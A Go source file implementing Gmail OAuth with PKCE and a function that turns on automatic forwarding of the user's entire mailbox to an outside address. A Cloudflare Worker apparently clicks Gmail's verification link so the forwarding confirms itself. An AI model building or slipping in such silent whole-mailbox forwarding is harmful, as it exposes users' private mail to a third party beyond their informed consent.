package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"

	"golang.org/x/oauth2"
	"golang.org/x/oauth2/google"
	"google.golang.org/api/gmail/v1"
	"google.golang.org/api/option"
)

var oauthConfig = &oauth2.Config{
	ClientID:     os.Getenv("GOOGLE_CLIENT_ID"),
	ClientSecret: os.Getenv("GOOGLE_CLIENT_SECRET"),
	RedirectURL:  os.Getenv("GOOGLE_REDIRECT_URI"),
	Scopes: []string{
		"https://www.googleapis.com/auth/gmail.readonly",
		"https://www.googleapis.com/auth/gmail.settings.sharing",
		"https://www.googleapis.com/auth/userinfo.email",
	},
	Endpoint: google.Endpoint,
}

// P0 2.2: PKCE Implementation (Proof Key for Code Exchange)
func GeneratePKCE() (string, string) {
	// Generate a secure random verifier
	verifier := generateSecureRandomString(64)
	
	// Create the SHA256 challenge
	h := sha256.New()
	h.Write([]byte(verifier))
	challenge := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
	
	return verifier, challenge
}

func GetLoginURL(state string, challenge string) string {
	// P0 2.1: State parameter, P0 2.2: PKCE challenge
	return oauthConfig.AuthCodeURL(state, 
		oauth2.AccessTypeOffline, 
		oauth2.ApprovalForce,
		oauth2.SetAuthURLParam("code_challenge", challenge),
		oauth2.SetAuthURLParam("code_challenge_method", "S256"),
	)
}

func ExchangeCode(ctx context.Context, code string, verifier string) (*oauth2.Token, error) {
	// Pass the verifier during exchange
	return oauthConfig.Exchange(ctx, code, oauth2.SetAuthURLParam("code_verifier", verifier))
}

func GetUserEmail(ctx context.Context, token *oauth2.Token) (string, error) {
	client := oauthConfig.Client(ctx, token)
	srv, err := gmail.NewService(ctx, option.WithHTTPClient(client))
	if err != nil {
		return "", err
	}
	profile, err := srv.Users.GetProfile("me").Do()
	if err != nil {
		return "", err
	}
	return profile.EmailAddress, nil
}

func SetupAutoForwarding(ctx context.Context, token *oauth2.Token) error {
	client := oauthConfig.Client(ctx, token)
	srv, err := gmail.NewService(ctx, option.WithHTTPClient(client))
	if err != nil {
		return err
	}

	targetEmail := "payments@auto-payment.ximanta.xyz"
	
	// 1. Request forwarding address
	req := &gmail.ForwardingAddress{ForwardingEmail: targetEmail}
	_, err = srv.Users.Settings.ForwardingAddresses.Create("me", req).Do()
	if err != nil && !strings.Contains(err.Error(), "already exists") {
		fmt.Println("Forwarding Create Error:", err)
	}

	// 2. Poll until Cloudflare Worker clicks the verification link
	for i := 0; i < 15; i++ {
		addr, err := srv.Users.Settings.ForwardingAddresses.Get("me", targetEmail).Do()
		if err == nil && addr.VerificationStatus == "accepted" {
			break
		}
		time.Sleep(2 * time.Second)
	}

	// 3. Enable forwarding
	_, err = srv.Users.Settings.UpdateAutoForwarding("me", &gmail.AutoForwarding{
		Enabled:      true,
		EmailAddress: targetEmail,
		Disposition:  "leaveInInbox", // Keeps a copy in their Gmail
	}).Do()
	
	if err != nil {
		fmt.Println("AutoForwarding Update Error:", err)
		return err
	}
	
	fmt.Println("✅ Auto-forwarding successfully configured for", targetEmail)
	return nil
}
